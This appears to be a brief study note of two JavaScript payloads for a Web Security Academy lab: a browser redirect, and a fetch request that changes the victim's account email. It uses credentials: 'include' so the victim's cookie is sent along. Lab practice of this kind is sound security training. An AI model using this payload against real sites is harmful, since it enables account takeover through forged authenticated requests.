redirect
```
window.location = "http://website.com"
```


fetch
```js
fetch('https://0a7c0048033740f983ae338f00260026.web-security-academy.net/my-account/change-email', {
	method: 'POST',
	headers: {
	  'Content-Type': 'application/x-www-form-urlencoded',
	},
	body: 'email=fetch@gmail.com',
	credentials: 'include', // Important, Because if you didn't use this. The browser won't fetch the cookie of the victim.
	mode: 'no-cors'
}).then(response => {
	console.log('Response:', response);
}).catch(error => {
	console.error('Error:', error);
});
```

